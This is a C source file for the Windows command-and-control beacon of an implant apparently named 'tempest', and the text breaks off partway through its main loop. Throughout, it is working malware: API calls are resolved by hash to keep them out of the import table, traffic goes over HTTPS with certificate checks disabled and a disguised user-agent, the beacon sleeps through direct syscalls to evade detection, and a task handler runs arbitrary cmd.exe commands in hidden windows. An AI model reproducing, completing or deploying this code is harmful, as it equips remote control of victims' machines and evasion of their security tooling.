/*
 * C2: same wire as linux_imp. TLS via winhttp, AES via BCrypt.
 * All kernel32 / winhttp / bcrypt / advapi32 calls go through EAT resolution (loader.c)
 * so those DLLs are not in the import table; LoadLibraryA is the only extra resolve.
 *
 * Registration path: UNLEN+1 for GetUserNameA; BCryptGetProperty checked before keygen;
 * b64url_enc return checked (never strlen on garbage); pointers nulled at loop starts.
 * AES-CBC: IV buffer is writable; BCryptEncrypt overwrites it (const/.rdata IV would AV).
 */
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>

#include "loader.h"
#include "morpheus.h"
#include "tempest_bootstrap.h"
#include "tempest_c2.h"

#define TEMPEST_UNLEN 256
#ifndef UNLEN
#  define UNLEN TEMPEST_UNLEN
#endif

#ifndef NT_SUCCESS
#  define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
/* Opaque BCrypt types — avoid bcrypt.h (import stubs) */
#ifndef BCRYPT_ALG_HANDLE
typedef void *BCRYPT_ALG_HANDLE;
typedef void *BCRYPT_KEY_HANDLE;
typedef void *BCRYPT_HANDLE;
#endif
/* HINTERNET / INTERNET_PORT come from winhttp.h — we avoid that header (dllimport). */
#ifndef HINTERNET
typedef void *HINTERNET;
#endif
#ifndef INTERNET_PORT
typedef unsigned short INTERNET_PORT;
#endif

/* ---- WinHTTP / BCrypt / kernel constants (avoid headers that drag imports) ---- */
#define WH_ACCESS_DEFAULT    0
#define WH_ADDREQ_ADD        0x20000000u
#define WH_OPT_SEC_PROTOCOLS 84u
#define WH_OPT_SEC_FLAGS     31u
#define WH_QUERY_STATUS      19u
#define WH_QUERY_NUM_FLAG    0x20000000u
#define WH_FLAG_TLS1_2       0x00000800u
#define WH_FLAG_TLS1_1       0x00000200u
#define WH_FLAG_TLS1         0x00000080u
#define WH_FLAG_TLS1_3       0x00002000u
#define WH_FLAG_SECURE       0x00800000u
/* Match imps/windows_noldr proto.rs (WinInet) ignore set — same numeric SECURITY_* + cert CN/DATE
 * bits. Do not add 0x80 (IGNORE_REVOCATION): WinHttpSetOption(SECURITY_FLAGS) often returns
 * ERROR_INVALID_PARAMETER (0x57) on WinHTTP with that bit; 0x10000 is STRENGTH_STRONG, also bad. */
#define TEMPEST_SSL_IGNORE ( \
    0x00000100u | 0x00000200u | 0x00001000u | 0x00002000u)
#define CP_UTF8_VAL          65001u
#ifndef CREATE_NO_WINDOW
#  define CREATE_NO_WINDOW 0x08000000u
#endif
#ifndef SW_HIDE
#  define SW_HIDE 0
#endif

#define BCRYPT_PAD_BLOCK 0x00000001u

#ifndef TS_SERVER
#  error TS_SERVER
#endif
#ifndef TS_PORT
#  error TS_PORT
#endif
#ifndef TS_SLEEP
#  error TS_SLEEP
#endif
#ifndef TS_JITTER
#  error TS_JITTER
#endif
#ifndef TS_UUID
#  error TS_UUID
#endif

/* Console trace (implementations after pGetLastError is defined) */
#ifndef TEMPEST_C2_TRACE
#  define TEMPEST_C2_TRACE 1
#endif
#if !TEMPEST_C2_TRACE
#  define c2_t(...) ((void)0)
#  define c2_t_winerr(a, b) ((void)0)
#endif

/* ---- FNV-1a module hashes (hash_name_wide / hash_name) — see stargate/loader.c ---- */
#  define H_K32   0xa25682a7u
#  define H_WINHTTP 0x54fff73fu
#  define H_BCRYPT 0xfa7637a1u
#  define H_ADVAPI 0x0b158f29u
/* functions */
#  define H_LoadLibraryA       0xf52d8293u
#  define H_GetModuleFileNameA 0xb734c119u
#  define H_CreatePipe         0x0bd7cb55u
#  define H_CreateProcessA     0xa0a37f15u
#  define H_CloseHandle        0x7205c1b9u
#  define H_WaitForSingleObject 0xd6e8b7a8u
#  define H_ReadFile          0x0be7d8dfu
#  define H_GetEnvironmentVariableA 0xbde7e527u
#  define H_MultiByteToWideChar 0xb65e6e86u
#  define H_GetTickCount64     0x41f5ad0bu
#  define H_GetLastError       0xe4e66493u
#  define H_GetCurrentProcessId 0x5fb665dcu
#  define H_ExitProcess        0x85b5a546u
#  define H_GetUserNameA       0x562144eeu
#  define H_WinHttpOpen              0xefe4d879u
#  define H_WinHttpSetOption         0x0240120eu
#  define H_WinHttpConnect           0x886d46c9u
#  define H_WinHttpOpenRequest       0x6e6994deu
#  define H_WinHttpAddRequestHeaders 0xd24f33c1u
#  define H_WinHttpSendRequest       0x57729460u
#  define H_WinHttpReceiveResponse   0xbf032ac5u
#  define H_WinHttpQueryHeaders      0x9f2076e3u
#  define H_WinHttpQueryDataAvailable 0xa3069d12u
#  define H_WinHttpReadData         0xd31e75f5u
#  define H_WinHttpCloseHandle      0x0c64d4b5u
#  define H_BCryptOpenAlgorithmProvider 0xdf1191e1u
#  define H_BCryptSetProperty   0x32be5294u
#  define H_BCryptGetProperty   0x2adc6808u
#  define H_BCryptGenerateSymmetricKey 0x83a40baeu
#  define H_BCryptEncrypt       0x148fc2a0u
#  define H_BCryptDestroyKey    0x34bcbd0au
#  define H_BCryptCloseAlgorithmProvider 0xb83ca8f3u

typedef HINTERNET (WINAPI *pWinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef BOOL (WINAPI *pWinHttpSetOption_t)(HINTERNET, DWORD, LPVOID, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpAddRequestHeaders_t)(HINTERNET, LPCWSTR, DWORD, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse_t)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpQueryHeaders_t)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpQueryDataAvailable_t)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *pWinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle_t)(HINTERNET);
typedef HMODULE (WINAPI *pLoadLibraryA_t)(LPCSTR);
typedef DWORD (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *pCreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *pCreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *pCloseHandle_t)(HANDLE);
typedef DWORD (WINAPI *pWaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *pReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI *pGetEnvironmentVariableA_t)(LPCSTR, LPSTR, DWORD);
typedef int (WINAPI *pMultiByteToWideChar_t)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef ULONGLONG (WINAPI *pGetTickCount64_t)(void);
typedef DWORD (WINAPI *pGetLastError_t)(void);
typedef DWORD (WINAPI *pGetCurrentProcessId_t)(void);
typedef void (WINAPI *pExitProcess_t)(UINT);
typedef BOOL (WINAPI *pGetUserNameA_t)(LPSTR, LPDWORD);
typedef NTSTATUS (WINAPI *pBCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *pBCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pBCryptGetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG *, ULONG);
typedef NTSTATUS (WINAPI *pBCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pBCryptEncrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG);
typedef NTSTATUS (WINAPI *pBCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS (WINAPI *pBCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);

static pLoadLibraryA_t pLoadLibraryA;
static pGetModuleFileNameA_t pGetModuleFileNameA;
static pCreatePipe_t pCreatePipe;
static pCreateProcessA_t pCreateProcessA;
static pCloseHandle_t pCloseHandle;
static pWaitForSingleObject_t pWaitForSingleObject;
static pReadFile_t pReadFile;
static pGetEnvironmentVariableA_t pGetEnvironmentVariableA;
static pMultiByteToWideChar_t pMultiByteToWideChar;
static pGetTickCount64_t pGetTickCount64;
static pGetLastError_t pGetLastError;
static pGetCurrentProcessId_t pGetCurrentProcessId;
static pExitProcess_t pExitProcess;
static pGetUserNameA_t pGetUserNameA;
static pWinHttpOpen_t pWinHttpOpen;
static pWinHttpSetOption_t pWinHttpSetOption;
static pWinHttpConnect_t pWinHttpConnect;
static pWinHttpOpenRequest_t pWinHttpOpenRequest;
static pWinHttpAddRequestHeaders_t pWinHttpAddRequestHeaders;
static pWinHttpSendRequest_t pWinHttpSendRequest;
static pWinHttpReceiveResponse_t pWinHttpReceiveResponse;
static pWinHttpQueryHeaders_t pWinHttpQueryHeaders;
static pWinHttpQueryDataAvailable_t pWinHttpQueryDataAvailable;
static pWinHttpReadData_t pWinHttpReadData;
static pWinHttpCloseHandle_t pWinHttpCloseHandle;
static pBCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider;
static pBCryptSetProperty_t pBCryptSetProperty;
static pBCryptGetProperty_t pBCryptGetProperty;
static pBCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey;
static pBCryptEncrypt_t pBCryptEncrypt;
static pBCryptDestroyKey_t pBCryptDestroyKey;
static pBCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider;

#if TEMPEST_C2_TRACE
static void c2_t(const char *fmt, ...) {
    va_list ap;
    fputs("[tempest c2] ", stderr);
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    (void)fflush(stderr);
}
static void c2_t_winerr(const char *op, const char *step) {
    DWORD e = pGetLastError ? pGetLastError() : 0u;
    c2_t("%s: %s failed, err=0x%lx", op, step, (unsigned long)e);
}
#endif

#define RES(mod, hname, T, v) do { (v) = (T)(void *)resolve_addr((mod), (hname)); if (!(v)) return -1; } while (0)

static int c2_resolve_init(void) {
    HMODULE k32, wh, bc, ad;
    k32 = (HMODULE)locate_base(H_K32);
    if (!k32) return -1;
    RES(k32, H_LoadLibraryA, pLoadLibraryA_t, pLoadLibraryA);
    wh = pLoadLibraryA("winhttp.dll");
    bc = pLoadLibraryA("bcrypt.dll");
    ad = pLoadLibraryA("advapi32.dll");
    if (!wh || !bc || !ad) return -1;
    RES(wh, H_WinHttpOpen, pWinHttpOpen_t, pWinHttpOpen);
    RES(wh, H_WinHttpSetOption, pWinHttpSetOption_t, pWinHttpSetOption);
    RES(wh, H_WinHttpConnect, pWinHttpConnect_t, pWinHttpConnect);
    RES(wh, H_WinHttpOpenRequest, pWinHttpOpenRequest_t, pWinHttpOpenRequest);
    RES(wh, H_WinHttpAddRequestHeaders, pWinHttpAddRequestHeaders_t, pWinHttpAddRequestHeaders);
    RES(wh, H_WinHttpSendRequest, pWinHttpSendRequest_t, pWinHttpSendRequest);
    RES(wh, H_WinHttpReceiveResponse, pWinHttpReceiveResponse_t, pWinHttpReceiveResponse);
    RES(wh, H_WinHttpQueryHeaders, pWinHttpQueryHeaders_t, pWinHttpQueryHeaders);
    RES(wh, H_WinHttpQueryDataAvailable, pWinHttpQueryDataAvailable_t, pWinHttpQueryDataAvailable);
    RES(wh, H_WinHttpReadData, pWinHttpReadData_t, pWinHttpReadData);
    RES(wh, H_WinHttpCloseHandle, pWinHttpCloseHandle_t, pWinHttpCloseHandle);
    RES(bc, H_BCryptOpenAlgorithmProvider, pBCryptOpenAlgorithmProvider_t, pBCryptOpenAlgorithmProvider);
    RES(bc, H_BCryptSetProperty, pBCryptSetProperty_t, pBCryptSetProperty);
    RES(bc, H_BCryptGetProperty, pBCryptGetProperty_t, pBCryptGetProperty);
    RES(bc, H_BCryptGenerateSymmetricKey, pBCryptGenerateSymmetricKey_t, pBCryptGenerateSymmetricKey);
    RES(bc, H_BCryptEncrypt, pBCryptEncrypt_t, pBCryptEncrypt);
    RES(bc, H_BCryptDestroyKey, pBCryptDestroyKey_t, pBCryptDestroyKey);
    RES(bc, H_BCryptCloseAlgorithmProvider, pBCryptCloseAlgorithmProvider_t, pBCryptCloseAlgorithmProvider);
    RES(k32, H_GetModuleFileNameA, pGetModuleFileNameA_t, pGetModuleFileNameA);
    RES(k32, H_CreatePipe, pCreatePipe_t, pCreatePipe);
    RES(k32, H_CreateProcessA, pCreateProcessA_t, pCreateProcessA);
    RES(k32, H_CloseHandle, pCloseHandle_t, pCloseHandle);
    RES(k32, H_WaitForSingleObject, pWaitForSingleObject_t, pWaitForSingleObject);
    RES(k32, H_ReadFile, pReadFile_t, pReadFile);
    RES(k32, H_GetEnvironmentVariableA, pGetEnvironmentVariableA_t, pGetEnvironmentVariableA);
    RES(k32, H_MultiByteToWideChar, pMultiByteToWideChar_t, pMultiByteToWideChar);
    RES(k32, H_GetTickCount64, pGetTickCount64_t, pGetTickCount64);
    RES(k32, H_GetLastError, pGetLastError_t, pGetLastError);
    RES(k32, H_GetCurrentProcessId, pGetCurrentProcessId_t, pGetCurrentProcessId);
    RES(k32, H_ExitProcess, pExitProcess_t, pExitProcess);
    RES(ad, H_GetUserNameA, pGetUserNameA_t, pGetUserNameA);
    return 0;
}

static const wchar_t s_bcrypt_alg_aes[] = L"AES";
static const wchar_t s_prop_olen[] = L"ObjectLength";
static const wchar_t s_prop_cmode[] = L"ChainingMode";
static const wchar_t s_val_cbc[] = L"ChainingModeCBC";

/* URL-safe + standard b64 */
static int b64idx(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '-' || c == '+') return 62;
    if (c == '_' || c == '/') return 63;
    return -1;
}
static int b64url_dec(const char *in, unsigned char **out, size_t *ol) {
    size_t L = strlen(in), i, j, end = L;
    int v, acc, bits; unsigned char *b;
    while (end > 0 && isspace((unsigned char)in[end - 1])) end--;
    b = (unsigned char *)malloc((end * 3) / 4 + 16);
    if (!b) return -1; acc = 0; bits = 0; j = 0;
    for (i = 0; i < end; i++) {
        if (isspace((unsigned char)in[i])) continue;
        if (in[i] == '=') break; v = b64idx(in[i]); if (v < 0) continue;
        acc = (acc << 6) | v; bits += 6; if (bits >= 8) { bits -= 8; b[j++] = (unsigned char)((acc >> bits) & 0xFF); }
    }
    *ol = j; *out = b; return 0;
}
static const char t64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
static int b64url_enc(const unsigned char *d, size_t n, char **s, size_t *slen) {
    size_t i, j; char *r = (char *)malloc(4 * ((n + 2) / 3) + 4);
    if (!r) return -1;
    for (i = 0, j = 0; i < n; i += 3) {
        uint32_t v = d[i] << 16; if (i + 1 < n) v |= (uint32_t)d[i + 1] << 8; if (i + 2 < n) v |= d[i + 2];
        r[j++] = t64[(v >> 18) & 63]; r[j++] = t64[(v >> 12) & 63];
        if (i + 1 < n) r[j++] = t64[(v >> 6) & 63];
        if (i + 2 < n) r[j++] = t64[v & 63];
    }
    r[j] = 0; *s = r; *slen = j; return 0;
}
static int aes256_enc(const unsigned char *k32, const unsigned char *pt, size_t pl, unsigned char **ct, size_t *cl) {
    BCRYPT_ALG_HANDLE a = NULL; BCRYPT_KEY_HANDLE ky = NULL; NTSTATUS s;
    ULONG r = 0, kobjl = 0, retsz = 0; unsigned char *kobj = NULL, *b = NULL;
    s = pBCryptOpenAlgorithmProvider(&a, s_bcrypt_alg_aes, NULL, 0);
    if (!NT_SUCCESS(s)) return -1;
    s = pBCryptSetProperty(a, s_prop_cmode, (PUCHAR)s_val_cbc, sizeof s_val_cbc, 0);
    if (!NT_SUCCESS(s)) { pBCryptCloseAlgorithmProvider(a, 0); return -1; }
    r = 0; kobjl = 0;
    s = pBCryptGetProperty(a, s_prop_olen, (PUCHAR)&kobjl, sizeof kobjl, &r, 0);
    if (!NT_SUCCESS(s) || kobjl == 0) { pBCryptCloseAlgorithmProvider(a, 0); return -1; }
    kobj = (unsigned char *)malloc(kobjl);
    if (!kobj) { pBCryptCloseAlgorithmProvider(a, 0); return -1; }
    s = pBCryptGenerateSymmetricKey(a, &ky, kobj, kobjl, (PUCHAR)k32, 32, 0);
    if (!NT_SUCCESS(s)) { free(kobj); pBCryptCloseAlgorithmProvider(a, 0); return -1; }
    retsz = (ULONG)(pl + 64);
    b = (unsigned char *)malloc(retsz);
    if (!b) { pBCryptDestroyKey(ky); free(kobj); pBCryptCloseAlgorithmProvider(a, 0); return -1; }
    r = 0;
    /* CBC: BCrypt updates IV in place — use writable stack, fresh zeros each call. */
    { unsigned char iv[16] = {0};
    s = pBCryptEncrypt(ky, (PUCHAR)pt, (ULONG)pl, NULL, (PUCHAR)iv, 16, b, retsz, &r, BCRYPT_PAD_BLOCK);
    }
    pBCryptDestroyKey(ky); free(kobj); pBCryptCloseAlgorithmProvider(a, 0);
    if (!NT_SUCCESS(s)) { free(b); return -1; } *ct = b; *cl = (size_t)r; return 0;
}
static int https_post(const char *op, const wchar_t *host, INTERNET_PORT port, const wchar_t *path, const char *headers,
    const void *body, DWORD blen, char **out_mem, unsigned long *http_status) {
#if !TEMPEST_C2_TRACE
    (void)op;
#endif
    HINTERNET hS, hC, hQ; DWORD f = (DWORD)TEMPEST_SSL_IGNORE, acc = 0, av, g, cap = 0, sc, stl = (DWORD)sizeof sc;
    char *a = NULL; DWORD sproto;
    *out_mem = NULL; *http_status = 0;
    hS = pWinHttpOpen(L"Mozilla/5.0 (Windows)", WH_ACCESS_DEFAULT, NULL, NULL, 0);
    if (!hS) { c2_t_winerr(op, "WinHttpOpen"); return -1; }
    if (!pWinHttpSetOption(hS, WH_OPT_SEC_FLAGS, &f, (DWORD)sizeof f))
        c2_t_winerr(op, "WinHttpSetOption(session, SECURITY_FLAGS)");
    sproto = WH_FLAG_TLS1_2 | WH_FLAG_TLS1_1 | WH_FLAG_TLS1 | WH_FLAG_TLS1_3;
    (void)pWinHttpSetOption(hS, WH_OPT_SEC_PROTOCOLS, &sproto, (DWORD)sizeof sproto);
    hC = pWinHttpConnect(hS, host, port, 0);
    if (!hC) { c2_t_winerr(op, "WinHttpConnect"); pWinHttpCloseHandle(hS); return -1; }
    hQ = pWinHttpOpenRequest(hC, L"POST", path, NULL, NULL, NULL, WH_FLAG_SECURE);
    if (!hQ) { c2_t_winerr(op, "WinHttpOpenRequest"); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; }
    if (!pWinHttpSetOption(hQ, WH_OPT_SEC_FLAGS, &f, (DWORD)sizeof f))
        c2_t_winerr(op, "WinHttpSetOption(request, SECURITY_FLAGS)");
    if (headers) {
        int nh = pMultiByteToWideChar(CP_UTF8_VAL, 0, headers, -1, NULL, 0);
        if (nh <= 0) { c2_t_winerr(op, "MultiByteToWideChar(headers)"); pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; }
        { wchar_t *hw = (wchar_t *)malloc((size_t)nh * sizeof(wchar_t));
        if (!hw) { c2_t("%s: malloc(headers)", op); pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; }
        pMultiByteToWideChar(CP_UTF8_VAL, 0, headers, -1, hw, nh);
        if (!pWinHttpAddRequestHeaders(hQ, hw, (DWORD)-1, WH_ADDREQ_ADD)) { c2_t_winerr(op, "WinHttpAddRequestHeaders"); free(hw);
            pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; } free(hw); }
    }
    if (!pWinHttpSendRequest(hQ, NULL, 0, (LPVOID)body, blen, blen, 0)) { c2_t_winerr(op, "WinHttpSendRequest");
        pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; }
    if (!pWinHttpReceiveResponse(hQ, NULL)) { c2_t_winerr(op, "WinHttpReceiveResponse (TLS/HTTP)"); pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; }
    sc = 0;
    pWinHttpQueryHeaders(hQ, WH_QUERY_STATUS | WH_QUERY_NUM_FLAG, NULL, &sc, &stl, NULL);
    *http_status = (unsigned long)sc;
    for (;;) {
        if (!pWinHttpQueryDataAvailable(hQ, &av) || av == 0) break;
        if (acc + av + 2 > cap) { cap = acc + av + 65536; a = (char *)realloc(a, cap);
            if (!a) { c2_t("%s: realloc body", op); pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS); return -1; } }
        if (!pWinHttpReadData(hQ, a + acc, av, &g)) break; acc += g;
    }
    if (a) a[acc] = 0; *out_mem = a;
    c2_t("%s: success HTTP %lu, body %zu byte(s)", op, (unsigned long)sc, a ? (size_t)acc : 0u);
    pWinHttpCloseHandle(hQ); pWinHttpCloseHandle(hC); pWinHttpCloseHandle(hS);
    return 0;
}
/* JSON string contents (RFC 8259): control U+0000-U+001F, \\ and \" must be escaped. Raw \\r\\n
 * in output breaks serde_json and crashed Anvil return_out. */
static void jesc(const char *i, char *o, size_t z) {
    const char *p;
    char *q = o;
    static const char hexd[] = "0123456789abcdef";
    if (z < 2) { if (z) o[0] = 0; return; }
    for (p = i; *p; p++) {
        unsigned char c = (unsigned char)*p;
        size_t need = 1;
        if (c < 0x20u) {
            if (c == '\n' || c == '\r' || c == '\t' || c == '\b' || c == '\f') need = 2;
            else need = 6; /* \u00XX */
        } else if (c == '\\' || c == '"') need = 2;
        if ((size_t)(q - o) + need >= z) break;
        if (c == '\\') { *q++ = '\\'; *q++ = '\\'; }
        else if (c == '"') { *q++ = '\\'; *q++ = '"'; }
        else if (c == '\n') { *q++ = '\\'; *q++ = 'n'; }
        else if (c == '\r') { *q++ = '\\'; *q++ = 'r'; }
        else if (c == '\t') { *q++ = '\\'; *q++ = 't'; }
        else if (c == '\b') { *q++ = '\\'; *q++ = 'b'; }
        else if (c == '\f') { *q++ = '\\'; *q++ = 'f'; }
        else if (c < 0x20u) {
            *q++ = '\\'; *q++ = 'u'; *q++ = '0'; *q++ = '0';
            *q++ = hexd[(c >> 4) & 0xFu]; *q++ = hexd[c & 0xFu];
        } else
            *q++ = (char)c;
    }
    *q = 0;
}
static void jstrip_str(const char *in, char *out, size_t n) { const char *a = in; char *b = out;
    while (*a == ' ' || *a == '\n' || *a == '\r' || *a == '\t') a++;
    if (*a != '"') { strncpy(out, in, n - 1); out[n - 1] = 0; return; } a++;
    for (; *a; a++) { if (*a == '\\' && a[1]) { a++; if ((size_t)(b - out) < n - 2) *b++ = *a; continue; }
    if (*a == '"') { *b = 0; return; } if ((size_t)(b - out) < n - 2) *b++ = *a; } *b = 0; }
static void exename_s(char *b, size_t n) { char t[MAX_PATH]; const char *e;
    t[0] = 0; pGetModuleFileNameA(NULL, t, MAX_PATH);
    e = t; { char *q; for (q = t; *q; q++) if (*q == '\\' || *q == '/') e = q + 1; }
    _snprintf(b, n, "%s", e[0] ? e : "beacon"); b[n - 1] = 0; }
static void sh_run(const char *args, char *o, size_t n) {
    char cmd[4096]; HANDLE ar = NULL, aw = NULL; SECURITY_ATTRIBUTES sa; STARTUPINFOA si; PROCESS_INFORMATION pi; DWORD r;
    o[0] = 0; sa.nLength = sizeof sa; sa.bInheritHandle = TRUE; sa.lpSecurityDescriptor = NULL;
    if (!pCreatePipe(&ar, &aw, &sa, 0)) { _snprintf(o, n, "pipe err\r\n"); return; }
    _snprintf(cmd, sizeof cmd, "cmd.exe /c %s", args);
    memset(&si, 0, sizeof si); si.cb = sizeof si; si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = NULL; si.hStdOutput = aw; si.hStdError = aw; si.wShowWindow = SW_HIDE;
    if (!pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { pCloseHandle(aw); pCloseHandle(ar);
        _snprintf(o, n, "CreateProcess err\r\n"); return; } pCloseHandle(aw);
    pWaitForSingleObject(pi.hProcess, 120000);
    { char t[1024];
      for (;;) { if (!pReadFile(ar, t, (DWORD)sizeof t, &r, NULL) || !r) break; if (strlen(o) + r < n - 1) strncat(o, t, n - strlen(o) - 1); }
    }
    pCloseHandle(ar); pCloseHandle(pi.hThread); pCloseHandle(pi.hProcess);
    if (o[0] == 0) { _snprintf(o, n, "(no output)\r\n"); } o[n - 1] = 0; }
static void run_line(const char *line, char *o, size_t n) { char t[4096], *c;
    o[0] = 0; strncpy(t, line, sizeof t - 1); t[sizeof t - 1] = 0; c = t;
    while (*c == ' ' || *c == '\t') c++;
    if (!strncmp(c, "kill", 4) && (c[4] == 0 || c[4] == ' ')) pExitProcess(0);
    if (!strncmp(c, "whoami", 6) && (c[6] == 0 || c[6] == ' ')) { char u[UNLEN+1]; DWORD L = sizeof u; u[0]=0; if (pGetUserNameA(u, &L)) _snprintf(o, n, "%s\r\n", u); return; }
    if (!strncmp(c, "sh ", 3)) { sh_run(c + 3, o, n); return; }
    if (!strncmp(c, "shell ", 6)) { sh_run(c + 6, o, n); return; }
    if (!strncmp(c, "ipconfig", 8) && (c[8] == 0 || c[8] == ' ' || c[8] == '\t')) {
        const char *r = c + 8; while (*r == ' ' || *r == '\t') r++;
        if (!*r) { sh_run("ipconfig", o, n); return; }
        { char x[4096]; _snprintf(x, sizeof x, "ipconfig %s", r); x[sizeof x - 1] = 0; sh_run(x, o, n); } return; }
    if (!strncmp(c, "cmd ", 4)) { sh_run(c + 4, o, n); return; }
    _snprintf(o, n, "Unknown: %s\r\n", c); o[n-1]=0; }
static void walk_json_strings(const char *j, void (*on)(const char *s, void *ud), void *ud) { const char *p; int esc; char buf[2048]; size_t o2;
    p = j; while (*p && *p != '[') p++; if (!*p) return; p++;
    for (;;) {
        while (*p && isspace((unsigned char)*p)) p++;
        if (*p == ']' || !*p) return; if (*p != '"') { p++; continue; } p++;
        o2 = 0; esc = 0;
        for (; *p; p++) { if (esc) { if (o2 < sizeof buf - 1) buf[o2++] = *p; esc = 0; continue; }
        if (*p == '\\') { esc = 1; continue; } if (*p == '"') { buf[o2] = 0; on(buf, ud); p++; break; }
        if (o2 < sizeof buf - 1) buf[o2++] = *p; }
        while (*p && isspace((unsigned char)*p)) p++;
        if (*p == ',') p++;
    } }
/*
 * Large task buffers in .bss (not ~1MB stack frames). Single C2 thread today; if you add worker
 * threads (e.g. SOCKS, long pwsh like imps/windows_noldr), stop using these globals from more than
 * one thread or guard with a lock / per-thread storage.
 */
typedef struct { char tcsv[8192], out[200000], *pout; int first; } c2_coll_t;
static c2_coll_t g_c2coll;
static char g_c2_onetask[200000];
static char g_tesc_t[20000];
static char g_tesc_o[200000];

static void on_task(const char *s, void *ud) { c2_coll_t *c = (c2_coll_t *)ud; char *t = g_c2_onetask, *pp = t; size_t L;
    if (!c->first) { L = strlen(c->tcsv); if (L + 1 < sizeof c->tcsv) { c->tcsv[L] = ','; c->tcsv[L + 1] = 0; } }
    c->first = 0; strncat(c->tcsv, s, sizeof c->tcsv - strlen(c->tcsv) - 1);
    run_line(s, t, (sizeof g_c2_onetask));
    for (pp = t; *pp; pp++) { if (c->pout - c->out < (int)sizeof c->out - 4) *c->pout++ = *pp; } *c->pout = 0; }

/* BM-T6001: beacon interval uses Morpheus (direct syscalls), not kernel32 Sleep. */
static void c2_backoff_sleep(morpheus_ctx_t *morph, DWORD ms)
{
    if (!morph) return;
    if (morpheus_sleep(morph, ms) != MORPHEUS_OK)
        c2_t("Morpheus sleep returned error (continuing loop)");
}

void tempest_c2_run(morpheus_ctx_t *morph) {
    unsigned char *k32 = NULL, *ct = NULL; size_t klen, cl, b64l;
    char *b64b = NULL, *resp = NULL, *jb = NULL; char hbuf[2048], jbuf[16384], euser[200], edom[200], eex[600], tok[512], sl[128];
    wchar_t wh[256]; unsigned long h; int port; port = atoi(TS_PORT);
    int jnreg;
    (void)cl;
    if (c2_resolve_init() != 0) { c2_t("FATAL: C2 API resolution failed (stargate loader)"); return; }
    c2_t("starting; TS_SERVER=%s port=%d uuid=%s", TS_SERVER, port, TS_UUID);
    if (b64url_dec(TEMPEST_AES_KEY_B64, &k32, &klen)) { c2_t("FATAL: TEMPEST_AES_KEY_B64 decode failed"); return; }
    if (klen != 32) { c2_t("FATAL: decoded AES key len=%zu (need 32), macro is %zu char(s) (expect 43).", klen, strlen(TEMPEST_AES_KEY_B64));
        c2_t("  Rebuild with `make` while AES_KEY is set (Anvil `build_imp`)."); free(k32); return; }
    c2_t("AES key decoded, %zu byte(s)", klen);
